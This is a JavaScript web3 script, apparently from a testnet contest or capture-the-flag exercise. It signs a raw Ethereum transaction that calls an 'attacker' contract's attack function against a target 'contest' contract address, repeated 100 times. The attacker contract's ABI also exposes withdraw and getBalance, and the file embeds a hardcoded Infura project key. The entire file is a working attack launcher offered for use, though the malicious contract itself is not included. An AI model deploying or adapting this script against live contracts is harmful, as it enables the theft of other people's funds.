const Web3 = require('web3');
const Tx = require('ethereumjs-tx');

const contestAddr = "0x7d47a521BF16079d73DA22428536693b94EE46f7"; //1m, 0.01
const attacker = "0x4BC45e632d9aC2b70Ab3D5e7c7d3C92Ed069D658";
const walletAddr = "0xcDc296a1058515E198BeAf5D2e87eC2b620aac03";
const privateKey = new Buffer('privatekey', 'hex');
//attacker's abi
const ABIArray = [
	{
		"constant": true,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": false,
		"inputs": [
			{
				"name": "target_",
				"type": "address"
			},
			{
				"name": "count",
				"type": "uint256"
			}
		],
		"name": "attack",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"payable": true,
		"stateMutability": "payable",
		"type": "fallback"
	}
];

//using parity wallet

//https://ropsten.infura.io/nEvK5iGbrxT4uktSVGDT
//http://localhost:8545
const web3 = new Web3(new Web3.providers.HttpProvider('https://ropsten.infura.io/nEvK5iGbrxT4uktSVGDT'));

//setInterval(setObserver, 1000);
attack();

function attack(){

    const contractAbi = web3.eth.contract(ABIArray); //attacker
    const attackerContract = contractAbi.at(attacker); //attacker contract

    const attackData = attackerContract.attack.getData(contestAddr, 100);
    const gasPriceHex = web3.toHex(20000000000); //20gwei
    const gasLimitHex = web3.toHex(1000000); //1m
    const nonce = web3.eth.getTransactionCount(walletAddr);
    const nonceHex = web3.toHex(nonce);
    console.log('nonceHex: ' + nonceHex);

    var transaction = {
        nonce: nonceHex,
        gasPrice: gasPriceHex,
        gasLimit: gasLimitHex,
        to: attacker,
        from: walletAddr,
        value: '0x00',
        data: attackData
    };

    var tx = new Tx(transaction);
    tx.sign(privateKey);

    var stx = tx.serialize();
    web3.eth.sendRawTransaction('0x' + stx.toString('hex'), (err, hash)=>{
        if(err) {
            console.log(err);
            return;
        }

        console.log('transaction tx: '+ hash);
    });
   
}